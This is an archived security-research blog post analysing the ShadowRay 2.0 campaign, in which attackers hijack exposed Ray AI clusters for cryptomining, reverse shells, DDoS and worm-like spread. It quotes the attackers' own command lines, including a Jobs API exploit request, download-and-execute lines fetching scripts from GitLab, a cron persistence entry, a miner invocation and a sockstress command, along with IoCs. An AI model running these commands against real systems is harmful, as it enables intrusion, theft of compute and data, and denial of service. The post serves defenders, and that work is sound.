---
url: "https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet"
title: "ShadowRay 2.0: Active Global Campaign Hijacks Ray AI Infrastructure Into Self-Propagating Botnet"
captured: "2026-11-02T18:57:19Z"
via: "live"
sha256: "a07b5db46f1c7a102e9e53f8b53b5521e2de296276750d6e6a9377918ca30680"
wayback: "https://web.archive.org/web/20260928141400/https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet"
cited_in:
  - "docs/threats/07-network-exposure-and-remote-access.md"
---

# ShadowRay 2.0: Active Global Campaign Hijacks Ray AI Infrastructure Into Self-Propagating Botnet

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet>
> Snapshot: <https://web.archive.org/web/20260928141400/https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet>

https://www.oligo.security/

[BOOK A DEMO](https://www.oligo.security/demo)

1

min read

# ShadowRay 2.0: Attackers Turn AI Against Itself in Global Campaign that Hijacks AI Into Self-Propagating Botnet

Date:

Nov 18, 2025

Category:

AI

Research

Author:

Avi Lumelsky

Gal Elbaz

[Page top](https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet#)

Oligo Security researchers have uncovered an ACTIVE global hacking campaign that uses AI to attack AI. The operation, dubbed ShadowRay 2.0, exploits a known, yet disputed, flaw in Ray, an open-source framework that powers many of today’s AI systems, to quietly seize control of powerful computing clusters and conscript them into a self-replicating botnet.

In early November 2025, the Oligo Security research team identified an attack campaign exploiting the [ShadowRay](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild) vulnerability ([CVE-2023-48022](https://nvd.nist.gov/vuln/detail/cve-2023-48022)) in Ray, a widely used open-source AI framework. This is the same flaw Oligo previously observed being exploited in late 2023 (see the new [MITRE, ShadowRay, Campaign C0045](https://attack.mitre.org/campaigns/C0045/)).

For the recent campaign, attackers leveraged DevOps-style infrastructure by using GitLab as a platform for updating and delivering region-aware malware. Oligo reported this activity to Gitlab and the attacker repository and account was removed on November 5, 2025. However, Oligo has determined that the attackers have migrated to GitHub in order to continue their campaign as of November 10, 2025, creating multiple accounts and new repos. It remains active.

The latest campaign represents a major evolution from our initial ShadowRay discovery. The attackers, operating under the name IronErn440, have turned Ray’s legitimate orchestration features into tools for a self-propagating, globally cryptojacking operation, spreading autonomously across exposed Ray clusters.

What makes this campaign particularly notable is the use of AI to attack AI: our analysis shows attackers leveraged LLM-generated payloads to accelerate and adapt their methods. We also observed multiple criminal groups competing for the same CPU resources, often terminating legitimate workloads and rival cryptominers to maximize profits.

Equally concerning is the campaign’s operational sophistication. The attackers limited CPU usage to ~60% to evade detection, disguised malicious processes as legitimate services, and hid GPU usage from Ray’s monitoring to avoid detection while leveraging premium compute resources. In addition, the attackers employed a DevOps-style infrastructure by using GitLab for real-time, region-aware malware updates and delivery.

Evidence suggests the operation could have been active since September 2024, compromising Ray clusters across multiple continents through automated OAST-based discovery.

This isn’t just another cryptojacking campaign. It’s the foundation of a multi-purpose botnet capable of DDoS attacks, data exfiltration, and global autonomous propagation.

What is also highly concerning is that this vulnerability is “disputed” because the maintainers indicate that Ray is not intended for use outside a “strictly-controlled network environment”. In practice however, users often deploy Ray without heeding this warning, which creates an extended window for exploitation, evidenced by its continued and expanded weaponization by attackers in the wild. In fact, there are now more than 230,000 Ray servers exposed to the internet, in contrast to the few thousand we observed during our initial ShadowRay discovery.

Below, we walk through:

- The ShadowRay campaign from March 2024
- The growth of exposed Ray servers
- The new waves of attacks leveraging CVE-2023-48022
- The attack group’s techniques
- How the attackers have evaded detection
- Recommendations for protection

## Why we looked into Ray (again)

Our renewed research into Ray began when we were looking into some customer environments and noticed that they were running Ray. While those instances were already protected through Oligo’s runtime security platform, the potential risk was flagged to ensure proper configuration and secure deployment of Ray, meaning no Oligo customer environments were impacted or targeted in this new attack campaign.

## A History Lesson: The Original ShadowRay Campaign

In March 2024, Oligo [unveiled ShadowRay](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild), a vulnerability that was leveraged in the first known attack campaign exploiting AI workloads in the wild. The attackers exploited CVE-2023-48022 that impacts Ray, the open-source AI framework commonly referred to as the “Kubernetes of AI.” The flaw allows unauthenticated remote code execution (RCE) through Ray’s Jobs API.

Our original research showed that thousands of exposed Ray servers had already been compromised across a variety of sectors. Attackers used them to run cryptominers, steal secrets, and exfiltrate data from live AI workloads.

While certain related issues were patched, CVE-2023-48022 itself was never directly fixed. The behavior in Ray is a design feature and is safe when used in a trusted environment that is not exposed to the internet. Following the disclosure, Ray maintainers issued configuration and deployment guidance, advising that “Security and isolation must be enforced outside of the Ray Cluster.”.

Source: https://docs.ray.io/en/latest/ray-security/index.html

DISCLAIMER: The new campaign does not relate to Anyscale’s (the developers of Ray) SaaS offerings or paid products. The sole intention of this blog is to support users of Ray by increasing awareness of its security aspects and common pitfalls.

At the same time, the broader security community has [continued to treat CVE-2023-48022 as a legitimate vulnerability](https://socket.dev/blog/google-osv-fix-adds-500-new-advisories). It is formally recognized in MITRE ATT&CK, NIST’s National Vulnerability Database (NVD), and Google’s Open Source Vulnerabilities (OSV) platform.

This means that while the CVE can be detected in environments, there is not a specific version to upgrade to. Users are urged to follow the official [Ray security guidelines](https://docs.ray.io/en/latest/ray-security/index.html) and also leverage [this open-source tool](https://github.com/ray-project/ray-open-ports-checker) to verify proper configuration of their clusters to avoid accidental exposure.

## The Growth of Exposed Ray Servers

Since early November 2025, our research team has identified significant renewed malicious activity in exposed Ray clusters around the world, nearly two years after us originally showing CVE-2023-48022 being exploited in the wild.

At the time of our original research, only thousands of exposed Ray servers were observed in the wild. Our scans today reveal that over 200,000 Ray servers remain exposed to the internet, with a portion confirmed as vulnerable or already compromised. Many of the exposed servers belong to active startups, research labs, and cloud-hosted AI environments, while some are honeypots.

The lack of a definitive patch, coupled with the assumption that users would self-secure their clusters, has allowed threat actors to weaponize the same underlying weakness, culminating in the new ShadowRay v2 campaign.

WorldWide spread of ray dashboards, after ShadowRay was discovered by Oligo there are more than 200K instances (10x increase). Source: Shodan

‍A time series view of vulnerable instances starting in April 2024. Source: Shodan

## New Threat Actors, New Attacks

The campaign we have observed mirrors some of the characteristics and behaviors consistent with ShadowRay’s original exploitation chain:

- RCE via the exposed Ray dashboard API.
- Payload injection to deploy cryptocurrency miners and data exfiltration tools.
- Persistence mechanisms disguised as Ray worker processes.
- New IoCs observed in compromised nodes (full list below).

While this new activity shares some common threads with our March 2024 research, it is being carried out by entirely new threat actors that are leveraging different techniques to reach their end goals.

## Two Waves of Attacks Uncovered

Our analysis of the ShadowRay 2.0 activity shows that the campaign did not end with a single takedown. Instead, it evolved across two platforms:

- Wave One – GitLab launched: In early November 2025, attackers were using GitLab for their payload evolution and delivery. After Oligo reported the activity to GitLab, the attackers’ account and repository was removed on November 5, 2025.
- Wave Two – GitHub launched: Within days of the GitLab takedown, the threat actors reestablished their operation by standing up a new GitHub repository to continue the advanced attacks via a repository that went live on November 10, 2025. On November 17, the repo was taken down, with attackers immediately creating a new one on the same day. The second wave remains active, demonstrating the attackers’ persistence and agility in maintaining the campaign.

Below, we walk through the technical details, findings, and evidence of the techniques the attackers have deployed in both phases of this ongoing campaign.

## GitLab-Launched Attack Campaign: Technical Breakdown and Evidence of Techniques

Below, we walk through the specific techniques the attackers used in this campaign with GitLab as their delivery mechanism, providing evidence of what was uncovered and how they used their methods to evolve from simple cryptojacking efforts to building a multi-purpose botnet.

### 1: Discovery - "Finding the Needle in the Internet Haystack"

Attackers used interact.sh (an OAST platform) to spray payloads across the internet and identify which Ray dashboard IPs were exploitable. By sending callbacks to oast.fun subdomain, they could track which servers executed their commands.

Attackers have triggered the very first step in Ray by posting a job that :

curl -X POST "[http://[host]:[port]/api/jobs/](https://about:blank)" -H 'Content-Type: application/json' -d '{"entrypoint": "curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun"}'

This is reconnaissance as a service - attackers weaponized out-of-band platforms to automatically discover vulnerable targets at scale. Instead of manual scanning, they let victims identify themselves by calling back. This approach also helps evade traditional scanning detection.

Attackers used oast.fun subdomain domains for free.
Source: https://github.com/projectdiscovery/interactsh

‍

### 2: Initial Access - "Exploiting Ray's Trust"

Attackers exploited completely unauthenticated Ray Job Submission APIs (/api/jobs/) on exposed dashboards. They submitted malicious jobs with commands ranging from simple reconnaissance (uname -a, id) to complex multi-stage Bash and Python payloads.

Ray's dashboard was designed for trusted internal networks but is frequently exposed to the internet without authentication. The attackers didn't need to exploit a vulnerability, they just used Ray's features as designed. This is a configuration vulnerability at scale.

Some payloads checked for EC2 Instances or machines with 4 CPUs (and at some point, the attackers increased it to a minimum of 8 CPUs).

Searching for AWS credentials

By seeing the permission errors attackers ran into in the compromised Ray dashboard job history and logs - attackers knew why payloads were failing. With detailed error messages printed to the job’s STDERR/STDOUT, they adapted their payloads and succeeded the next time.

The obfuscated “stage 2” of the payload includes the docstrings and useless echoes, which strongly implies the code is LLM-generated:

Notice the comment: "Suppress the warnings inside payload as well” - as if the attackers asked for it specifically.

The payloads were base64-encoded. After decoding, we can see the LLM-generated payloads still include their documentation - like we saw with the rest of the payloads. Stage 2 is around resource discovery, and uses only 1 CPU.

### 3: Lateral Movement - "Weaponizing Ray's Orchestration"

Attackers deployed a payload that used Ray's [NodeAffinitySchedulingStrategy](https://docs.ray.io/en/latest/ray-core/api/doc/ray.util.scheduling_strategies.NodeAffinitySchedulingStrategy.html) to execute malware on every alive node in the cluster. The payload literally enumerated all nodes and submitted jobs pinned to each specific node ID.

This is lateral movement via legitimate orchestration features in Ray. Instead of exploiting CVEs or using network attacks, attackers used Ray's own scheduling API to spread. It's essentially using the victim's infrastructure as intended, using python code - like the applications that are already running, just for malicious purposes:

nodes=[n for n in ray.nodes() if n.get('Alive',False)]

cmd='wget -qO- https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/aa.sh | tr -d "\\r" > aa_clean.sh && chmod +x aa_clean.sh && ./aa_clean.sh'

[ray.get(ray.remote(lambda: subprocess.run(cmd,shell=True)).options(scheduling_strategy=NodeAffinitySchedulingStrategy(node_id=n.get('NodeID')...

‍

Attackers ran the payloads several times. We could see long-running active payloads in realtime. The reverse shell was open for 22 hours.

A compromised cluster with 1000GB Memory (1TB). This was only the beginning.

### 4: AI-Generated Reconnaissance - "Using AI to Attack AI"

Attackers deployed a sophisticated multi-stage Python payload that discovers cluster resources (CPUs, GPUs), calculates optimal allocation (60%), and then submits a takeover job with those exact resource requirements.

The payloads from gitlab are likely to be AI-generated, based on its structure, comments, and error handling patterns. Attackers are now using AI to generate attack code targeting AI infrastructure. The 60% resource allocation is particularly clever, as it leaves enough resources running to avoid immediate detection while maximizing mining profits.

Key Payload Features:

- Automatic CPU/GPU discovery via ray.cluster_resources()
- Dynamic resource calculation: usable_cpus = max(1, int(total_cpus * 0.6))
- Multi-stage execution with error handling

A machine with 8 or more CPUs and root access is considered a “VERY GOOD BOY”.
A joke by the attackers?

### 5: Reverse Shells - "Opening the Backdoor"

Attackers established multiple interactive reverse shells to AWS-hosted C2 servers, giving them command-line access to compromised Ray clusters. Multiple shells to different ports suggest redundancy or different attack operators.

The use of multiple simultaneous reverse shells on different ports indicates either multiple attackers competing for access or sophisticated failover mechanisms. Evidence shows shells connecting to ports 3876, 40331, 48331, and 443 - suggesting extensive C2 infrastructure.

Attacker IP in reverse shell python payload

Active reverse shells to the attacker's IPs

One can see the opened Python reverse shells in the Ray dashboard job history

### 6: Persistence - "Ensuring They Never Leave"

Attackers installed multiple persistence mechanisms: cron jobs running every 15 minutes, systemd services disguised as system components, and .bashrc injections. The cron job continuously re-downloads and executes mon.sh from GitLab.

The use of GitLab as a live C2 infrastructure means attackers can update payloads in real-time. Every 15 minutes, all compromised systems check for updates and re-infect themselves. This turns GitLab into a distributed update mechanism for malware.

Cron Job:

*/15 * * * * wget -O - https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/mon.sh | bash

‍

### 7: Masquerading - "Hiding in Plain Sight"

Attackers renamed malicious processes to look like legitimate Linux kernel workers (kworker/0:0) and system services (dns-filter). The XMRig cryptocurrency miner was renamed to .python3.6 and disguised as a systemd service.

The sophistication of process renaming goes beyond simple hiding. By using echo "kworker/0:0" > /proc/$$/comm, they change how the process appears in system monitoring tools. The name "dns-filter" suggests DNS filtering, which IT teams might expect to see running.

Masquerading Techniques:

- Process rename to [kworker/0:0] (appears as kernel worker)
- Binary named /usr/lib/dev/systemdev/dns-filter (looks like system service)
- Hidden binary .python3.6 in current directory
- Systemd service names: custom-X-service

‍

The persistence method - using crontab and system service, disguised as ‘health-monitor’, ‘dns’ or as ‘dns-filter’.

/tmp/dns is a cryptominer

./aa_clean.sh is a middle recon stage by the attackers.

Downloading cryptominer to /usr/lib/dev/systemdev/dns-filter

Downloading the “aa.sh” script from GitLab in the payload.

Newer shells used “netsh” while older reverse shells started via /var/tmp/.ddns.sh

Disguising as Python 3.6 process

### 8: GPU Mining - "Stealing Premium Compute"

Attackers specifically targeted Ray clusters with NVIDIA GPUs (A100s in particular). Environment variables show NVIDIA libraries loaded and 23.9GB of GPU memory consumed, but Ray's dashboard reports 0% GPU utilization, indicating a hidden miner.

GPU cryptojacking is a goldmine, because A100 GPUs cost $3-4/hour on cloud platforms. By hiding GPU usage from Ray's monitoring, attackers avoid immediate detection while stealing premium compute resources. The resource discovery payload specifically checks for GPU availability before deploying GPU-enabled miners.

Cluster of NVIDIA A100 GPUs

Making the machine look under-utilized: The Ray GPU utilization looks low (0%) as the subprocess that runs XMRig takes over the GPU resources in practice.

### 9: Competition Elimination - "Cryptojacker vs. Cryptojacker"

Attackers deployed sophisticated scripts to detect and kill rival cryptocurrency miners. They hunt for processes matching patterns like "xmrig", "minerd", "ccminer", or any process using >25% CPU. They also block competing mining pools via /etc/hosts and firewall rules.

This reveals a hidden war between cryptojacking groups. Multiple attackers are targeting the same Ray clusters, and they're actively fighting each other for resources. The scripts specifically protect their own miner (connected to supportxmr.com) while killing everything else. It's organized crime with source code.

Protection Logic:

if echo "$cmdline" | grep -vq "supportxmr.com" && echo "$cmdline" | grep -q "xmrig"; then

kill -9 "$pid" # Kill rival miner

fi

Blocked Mining Pools:

- pool.minexmr.com
- xmrpool.eu
- Multiple other Monero pools via /etc/hosts and iptables

Logs from a compromised dashboard, the payload is blocking competitor mining pool, and hosts, using hosts file and iptables.

Attackers explicitly killing running miners

Kicking out competitors - Manipulation of iptables to block other attackers and threat actors from reaching the vulnerable instance again after killing their processes.

Killing specific "unwanted' processes by name (index.js and xmr by name)

Killing CPUs with high utilization, except their own miner (by pattern found in cmdline)

Logic to determine which miners not to kill or not.

Blocking other common mining pools - to fail other attackers that might reach the compromised server later.

Payload config

The same file as above, on GitLab - at a later point in time. Their “NEW POOL & WALLET” according to the docstrings - the attackers have been doing it with different addresses for along time.

### 10: Geographic Targeting - "Adapting to the Victim"

Attackers implemented geolocation detection to identify if the victim is in China. Chinese victims receive payloads from run-CN.sh (using China-accessible CDNs), while others get run.sh. This suggests infrastructure optimization and censorship bypass.

This is region-aware malware. By detecting the victim's country, attackers can adapt delivery methods, potentially use regional proxies (GitHub proxy and Chinese IP geolocation services), and optimize for network conditions. It suggests a mature operation targeting global infrastructure world-wide.

Geolocation Detection:

if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '"country":"China"'; then

is_in_china=true

download_url="https://gitlab.com/ironern440-group/ironern440-project/-/raw/main/run-CN.sh"

fi

Payload checks for China geolocation via ip-api.com - which is available in china.

Proxied download via [gh-proxy.com](http://gh-proxy.com) - so the payload will succeed in Chinese servers that have censored DNS support - or to bypass security rules that prevent requests to [github.com](http://github.com) directly.

Some payloads tried using either wget or curl - usually one of them was present on the machine and fetched the initial payload from GitLab, and later, the miner through GitHub.

### 11: Cryptocurrency Mining - "The Payoff"

Attackers deployed XMRig miners connecting to pool.supportxmr.com:443 using TLS encryption. Multiple compromised clusters show 99% CPU usage and significant GPU utilization.

The use of TLS on port 443 makes mining traffic look like legitimate HTTPS traffic, blending into normal network activity. The mining pool tracks show regular payouts, confirming this is an active, profitable operation.

Example Mining Configuration (there were many):

/usr/lib/dev/systemdev/dns-filter -o pool.supportxmr.com:443 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls

The files when accessed on Nov. 2

The files when accessed on Nov. 4 Attacker payload changes were visible through GitLab diffs:

The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.

The difference was visible through GitLab easily - Here is a commit that removes all comments (probably using an LLM too).

Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases.

Note the commented out "old" repo in gitlab

Attackers have downloaded cryptominer binaries from different repositories, hosts and IPs over time. We found this gitlab username in one of the payload’s comments, probably leftovers of an older payload from an older repository.

We looked at the username, and found it was blocked, probably due to the same malicious activity by the group.

CryptoMiners binaries were often served through GitHub release files.

The inspected GitHub repositories had no code at all, only releases that include cryptominers in the artifacts. This kind of repository behavior is suspicious and benefits malware thanks to github’s SSL and domain trust - and it seems to be up for more than 6 years. It is quite easy to identify repositories with similar characteristics (not code, many releases).

The configuration of the payload that is being downloaded from GitLab.

Platform-independent firewall blocking of competing miners through hosts file

### 12: Live Campaign Evolution - "Attack Infrastructure as Code"

The GitLab repository ironern440-group/ironern440-project showed active commits, meaning attackers are iterating on their payloads in real-time. All compromised systems pulled updates every 15 minutes, so improvements propagate across the entire botnet within hours.

This is DevOps for cybercrime. Attackers used GitLab as their CI/CD pipeline for malware distribution. They can A/B test techniques, roll back failed updates, and respond to defensive measures - all through version control. The commit history showed active development in realtime.

The files when accessed in Nov. 2

The files when accessed in Nov. 4

Attacker payload changes were visible through GitLab.

The attackers changed their “exclude pattern” - their own miner fingerprint - that is used to distinguish other miners that were a result of another attack group.

The diff was visible through GitLab easily - a commit that removes all comments of the LLM-generated payloads.

Some payloads were hosted on GitHub. This repo is used for hosting malware as GitHub version releases

CryptoMiners were served through GitHub release files

Attackers have downloaded the XMRig (cryptominer) from different repositories and IPs over time. We found this gitlab username in one of the payload commented out bash lines.

The commented out username found in one of the payloads was blocked, probably due to the same activity.

The configuration of the payload that is being downloaded from GitLab.

Attackers added their own SSH Keys. They tried different home directories and users.

Attackers added their own SSH Keys. They tried different home directories and users. After enumeration, they succeeded and added their own SSH key to root’s authorized keys.

### 13: Sensitive Data Access - "Beyond Cryptocurrency"

Attackers could see everything the workloads are doing - including access to the proprietary AI models and filesystem, application user requests, application code and configuration.
They discovered and exfiltrated MySQL database credentials from Ray job environment variables and config files. The exposed credentials provide root access to a MySQL database that is used in production application.

We also found many security tokens and cloud credentials present on the compromised machines workloads - by analyzing the code, command lines and and the environment variables of the running processes on the compromised machines. This reveals the attack scope extends beyond cryptojacking.

With database credentials, attackers can exfiltrate sensitive data, inject backdoors into applications, or sell access to other threat actors. The presence of MySQL credentials in environment variables (just one example) suggests the compromised system is part of a larger application infrastructure.

On some instances that models were present (for example, pytorch pickle file of the model weights and frozen graph). These proprietary, custom models are considered unique IP that is a competitive advantage to the company. Attackers could steal them from the compromised machines, as well as their source code and user data that was retained on the machines.

### 14: DDoS in action - "Multi-Purpose Botnet"

Attackers deployed sockstress, a TCP state exhaustion tool, targeting production websites. This suggests the compromised Ray clusters are being weaponized for denial-of-service attacks, possibly against competing mining pools or other infrastructure - or as another way to monetize their compromised hardware (compromised infrastructure as a service).

This transforms the operation from pure cryptojacking into a multi-purpose botnet. The ability to launch DDoS attacks adds another monetization vector - attackers can rent out DDoS capacity or use it to eliminate competition. The target port 3333 is commonly used by mining pools, suggesting attacks against rival mining infrastructure.

DDoS Command used by attackers:

./sockstress <redacted_hostname> 3333 eth0 -p payloads/http

'sockstress' used for DDOS - with specific IPs and specific ports.

### 15: Spray and Pray - "Using Victims to Find More Victims"

Compromised Ray clusters were used to spray attack payloads to other Ray dashboards worldwide. The attackers essentially created a self-propagating worm that uses one victim to scan for and compromise the next victim.

This is worm-like behavior in cloud infrastructure. Instead of centralized scanning (which is noisy and detectable), attackers distributed the scanning across their botnet. Each compromised cluster helps discover and infect new clusters, creating exponential growth. The use of interact.sh for callback means attackers only see successful compromises, reducing noise.

Propagation Flow:

- Compromised Cluster A scans for exposed Ray dashboards
- Sends test payload with interact.sh callback
- Attacker sees successful callback
- Attacker sends full payload to new victim
- New victim joins botnet and starts scanning
- Repeat

## GitHub-Launched Attack Campaign: Technical Breakdown and Evidence of Techniques

Following the attackers’ GitLab account and repository being taken down on November 5, 2025, the attackers migrated the repo to GitHub, where they remain active. They created the new GitHub repo on November 10, 2025.
Below, we walk through the techniques the attackers used with GitHub as their delivery mechanism, providing evidence of what was uncovered and how they evolved their methods.

### Moving to GitHub

The second phase was even more successful.

Attackers Ported to GitHub on November 10, 2025. We identified a compromised Ray cluster and were surprised to see a new GitHub repository in the payload from the willd, replacing the repository that was removed by GitLab after we reported the first phase.

The public repository https://github.com/thisisforwork440-ops/ironrock was used in the payload

Note the documentation - the caps letters and extensive changelog documentation hints on AI-assisted exploit adaptation based on feedback.

### Compromised Clusters With Thousands of Active Nodes (machines)

Attackers put hands on internet-facing clusters with thousands of machines (Worth $4M USD per year) - utilizing 100% CPU on the compromised Ray nodes:

Ray cluster with more than thousand active nodes that was compromised - 100% CPU utilization on 60% of the cluster.

Cluster HW breakdown. The annual price on-demand exceeds $3 million USD from this cluster alone!

One of the servers had a network NFS mount, which included 240GB of Source Code, AI Models and Datasets. Everything the company is doing for the past few years, exposed to the internet.:

Archive that includes source code, models, and datasets - 240GB compressed (Petabytes after extraction)

Machines with access to AWS EKS roles

The attackers used POCs for ShadowRay from the internet for Initial Access - we identified it through reverse search, it looked familiar.

### Mining Pool Statistics

In a new mining pool for the second phase of the attack, the attackers reached the #1 spot among 100+ registered miners. The attacker HashRate (and financial reward) kept increasing until we reported the user activity to GitHub.

### Improving the exploit

The attackers leveraged a new cryptominer that utilizes GPU better, by checking whether it is a GPU machine (through ‘nvidia-smi’ utility)

Masquerading new legitimate paths for the binaries

New cronjobs were utilizing the GitHub repo -note the documentation ("**China Version**")

We found many new IoCs in the second part of the campaign.

An ELF executable that was downloaded from the attacker’s servers. We started reverse engineering it . It was an unpacker with unpopular compression that executed code through stack-based syscall direct execution

Reverse Engineering the dropper/unpacker. The attackers used a custom dropper/loader with LZSS compression, dynamic syscalls invocation like mmap and memunmap through a function pointer, ROP and stack manipulation. The direct syscall() instruction bypasses libc and many security products.

‍

The binary cryptominer used was flagged by 28 out of 65 vendors on VirusTotal.

We reported the account to GitHub, which quickly blocked it as of November 17, 2025.
The attackers opened a new account on the same day, within 2 hours, and continue to use GitHub. We believe this campaign is automated due to the pace of recovery and stealthy operation across providers and worldwide.

## Attack Matrix Breakdown

The ShadowRay campaign TTPs breakdown is available in the [Application Attack Matrix](https://app-attack-matrix.com/attacks/#shadowray):

The sub-techniques used by attackers in ShadowRay from March 2024.
Now, attackers are more sophisticated, and were using techniques we have not seen before.

More onhttps://app-attack-matrix.com/attacks/#shadowray

## Why It Matters: Growing AI Attack Surface

AI workloads are increasingly deployed at scale, often with less mature security controls than traditional infrastructure. Because Ray’s design assumes an internal, trusted environment, many clusters are deployed with ports exposed publicly, and authentication disabled. These factors make ShadowRay a ripe vulnerability for attackers to exploit, as it has a dangerous combination of a lot of exposed infrastructure and the ability to lead to meaningful impact for attackers.

As organizations race to deploy AI systems, it’s critical to remember that many AI products and services embed or depend on Ray, making it pivotal to ensure it is configured properly across environments. Plus, many AI orchestration tools remain vulnerable to [0.0.0.0-style](https://www.oligo.security/blog/0-0-0-0-day-exploiting-localhost-apis-from-the-browser)misconfigurations that mirror ShadowRay’s exploitation pattern.

The Risk of Disputed Vulnerabilities

The ShadowRay case highlights a critical challenge in modern software security: what happens when a [vulnerability is disputed instead of fixed](https://www.oligo.security/blog/shadow-vulnerabilities-in-ai-the-hidden-perils-beyond-cves). When Oligo first disclosed active exploitation of CVE-2023-48022 in 2024, the Ray maintainers argued that Ray should only ever run in tightly controlled, closed environments, and therefore saw no need to release a patch. Nearly two years later, attackers are still exploiting the same flaw, in new and increasingly sophisticated campaigns, even in later Ray versions that are up to date.

Disputed vulnerabilities create a dangerous gray area for defenders because they are not formally patched. As a result, organizations may unknowingly deploy or run software that remains exploitable in real-world conditions. ShadowRay demonstrates how attackers exploit that uncertainty, targeting configurations that weren’t meant to be internet-facing, chaining legitimate orchestration features, and adapting rapidly with AI-generated payloads.

Understanding your environment becomes essential. Knowing not only what open-source components you use, but how they are configured, exposed, and behaving at runtime, can be the difference between protection and compromise.

## Mitigation Strategies

For organizations that run Ray in their environments, below are mitigation and protection recommendations.

- Leverage Anyscale’s [Ray Open Ports Checker](https://github.com/ray-project/ray-open-ports-checker) to verify proper configuration of the clusters to avoid accidental exposure. See [Anyscale’s Update on CVE-2023-48022](https://www.anyscale.com/blog/update-on-ray-cve-2023-48022-new-verification-tooling-available).
- Follow the [Ray Deployment Best Practices](https://docs.ray.io/en/latest/ray-security/index.html) for securing Ray deployments.

- Start with running Ray within a secured, trusted environment.
- Always add firewall rules or security groups to prevent unauthorized access.

- Add authorization on top of the Ray Dashboard port (8265 by default).

- If you do need Ray’s dashboard to be accessible, implement a proxy that adds an authorization layer to the Ray API when exposing it over the network.

- Continuously monitor your production environments and AI clusters for anomalies, even within Ray.

- Ray depends on arbitrary code execution to function. Code Scanning and Misconfiguration tools will not be able to detect such attacks, because the open-source maintainers of Ray (Anyscale) marked it as disputed and confirmed it is not a bug - at the time of writing, it is a feature.
- Don’t bind on 0.0.0.0 to make your life easy - It is recommended to use an IP of an explicit network interface, such as the IP that is in the subnet of your local network or a trusted private VPC/VPN.
- Don’t trust the default - Sometimes tools assume you read their docs. Do it.
- Use the right tools - The technical burden of securing open source is yours. Don't rely on the maintainers, there are tools that can help you protect your production workloads from the risks of using open source at runtime.

# How to find out if you are compromised

## Indicators of Compromise (IoCs)

‍

| IOC Type  | Indicator  | Port ֿ/ Details  | Context

| IP Address  | 18.228.3.224  | 48331, 3876  | AWS-hosted primary C2 server for reverse shells - São Paulo, Brazil (Amazon.com, amazonaws.com)

| IP Address  | 45.95.168.100  | 8000  | Attackers C2 / File server for downloading binaries

| IP Address  | 185.215.180.70  | 8000  | Attackers C2 / File server for downloading binaries

| IP Address  | 104.194.151.181  | 443  | Attackers Reverse Shell - United Kingdom (Tornado Datacenter, cloudzy.com)

| IP Address  | 121.160.102.68  | 8384  | Attackers Reverse Shell - Seongbuk-gu, Seoul, South Korea (KT, Cable/DSL)

| IP Address  | 54.154.170.233  | 30654  | Attackers Reverse Shell - Dublin, Ireland (Amazon.com, amazonaws.com)

| IP Address  | 158.160.123.117  | 4444  | Attackers Reverse Shell - Moscow, Russia (Yandex.Cloud)

| IP Address  | 193.29.224.83  | 6543  | Attackers Reverse Shell - Helsinki, Finland (Aeza International, ptr.network)

| IP Address  | 162.248.53.119  | 8000  | Attacker payload server (netsh, myscript.sh) - United States (Gigas Hosting Usa, LLC)

| IP Address  | 103.127.134.124  | 30654  | Attacker - Reverse Shell - Bogor, Indonesia (PT. Biznet Gio Nusantara, biznetg.io)

| IP Address  | 18.230.118.147  | 443, 40331  | Attacker AWS-hosted secondary C2 server, XMRig mining - São Paulo, Brazil (Amazon.com, amazonaws.com)

| IP Address  | 67.217.57.240  | 666  | Attacker File hosting server for malware distribution (netsh) - United States (Interserver)

| IP Address  | 45.61.150.83  | 80  | Attacker file hosting server for malware distribution (xd.sh) based in United States

| Domain  | *.oast.fun  | 53  | OAST platform (interact.sh) callback for discovery reconnaissance

| SubDomain  | bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun  | 80, 443  | Attacker out-of-band interactsh subdomain for out-of-band callback (DNS/HTTP request) - phone home to alert about compromised IP

| Command Line  | curl bwqqvqfgsseplyoltois92rdukv0mm5th.oast.fun  |   | InteractSH attackers oast.fun subdomain callback for discovery before initial access (attacker’s crawlers sprayed this payload)

| Command Line  | disown  |   | Detaching processes in Ray clusters (Keep the subprocess with reverse shells and cryptominers)

| Domain  | pool.supportxmr.com  | 443  | Primary Monero mining pool (TLS-encrypted)

| Domain  | gulf.moneroocean.stream  | 20128  | Secondary Monero Mining Pool

| Monero Wallet Address  | 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1  |   | Attacker's Monero wallet address

| ZANO Wallet Address  | KrQtbtsrPTqSTzQwZZisiyJxgtcDMwrdVrQ  |   | Attacker ZANO address used in cryptominer payload

| Mining Pool Address  | eu.zano.k1pool.com  | 8866  | ZANO Mining pool observed in GitHub second payload (xd.sh)

| SSH Public Key  | ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHy6WMgqslpdUCaumLmlUcBjBjuAk4KspADxbcAKrzYd root@archtop  |   | Attacker’s SSH Public key that was appended to the authorized keys file during the payload, to enable SSH access.

| GitLab Repository  | gitlab.com/ironern440-group/ironern440-project  | 443  | Primary C2 for payload hosting and continuous updates

| GitLab User  | ironern440-group  |   | Attacker's 1st stage GitLab organization (blocked)

